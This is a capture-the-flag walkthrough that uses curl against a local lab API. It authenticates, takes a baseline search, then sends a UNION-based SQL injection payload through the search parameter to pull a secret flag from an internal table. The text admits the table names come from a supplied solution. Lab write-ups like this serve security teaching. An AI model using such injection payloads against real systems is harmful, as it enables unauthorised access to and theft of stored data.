# Walkthrough

## SQL Injection in the Search API

## Objective

Exploit SQL injection in the authenticated search endpoint to retrieve the flag stored in an internal assessment record.

**Target:** `http://127.0.0.1:8080`

**Tools:** `curl`

## 1. Authenticate

Log in using the lab account:

```
curl -s -X POST http://127.0.0.1:8080/api/login -H "Content-Type: application/json" -d '{"username":"researcher","password":"Archive2026-researcher"}'
```

The API returns an authentication token:

```
{
  "expires_in": 3600,
  "token": "<TOKEN>"
}
```

Save the returned token for subsequent requests:

```
TOKEN='<TOKEN>'
```

Replace `<TOKEN>` with the actual value from the login response.

## 2. Inspect the Product Listing

Request the available products using the bearer token:

```
curl -s http://127.0.0.1:8080/api/products -H "Authorization: Bearer $TOKEN"
```

Response:

```
{
  "results": [
    {
      "category": "apparel",
      "id": 1,
      "name": "Conference Hoodie"
    },
    {
      "category": "stationery",
      "id": 2,
      "name": "Speaker Notebook"
    },
    {
      "category": "accessories",
      "id": 3,
      "name": "Backstage Mug"
    }
  ]
}
```

Each product is represented by an `id`, a `name`, and a `category`. This response structure will help interpret the injected results later.

## 3. Establish Normal Search Behavior

Search for a known product:

```
curl -s "http://127.0.0.1:8080/api/search?q=Hoodie" \
  -H "Authorization: Bearer $TOKEN"
```

Response:

```
{
  "results": [
    {
      "category": "apparel",
      "id": 1,
      "name": "Conference Hoodie"
    }
  ]
}
```

The endpoint accepts a search term through the `q` parameter and returns matching products. This provides a baseline for comparison with the injection response.

## 4. Exploit UNION-Based SQL Injection

Submit the following payload through the same parameter:

```
nozzle' UNION SELECT id, label, secret_value FROM assessment_records --
```

Request:

```
curl -s -G "http://127.0.0.1:8080/api/search" \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=nozzle' UNION SELECT id, label, secret_value FROM assessment_records --"
```

The `-G` option sends the supplied data as URL query parameters. `--data-urlencode` encodes the payload so that spaces, quotation marks, and other characters are transmitted correctly.

The payload works as follows:

- `nozzle` supplies a search term that produces no ordinary product results in the observed response.
- `'` breaks out of the SQL string containing the search input.
- `UNION SELECT` adds rows from another query to the original result set.
- `id, label, secret_value` selects three columns from `assessment_records`.
- `--` comments out the remaining SQL on the line.

This successful payload uses the table and column names shown in the supplied solution. The recorded steps do not include a separate schema-discovery phase.

## 5. Retrieve the Flag

The API returns:

```
{
  "results": [
    {
      "category": "duck{FLAG}",
      "id": 1,
      "name": "Q3 Internal Assessment"
    }
  ]
}
```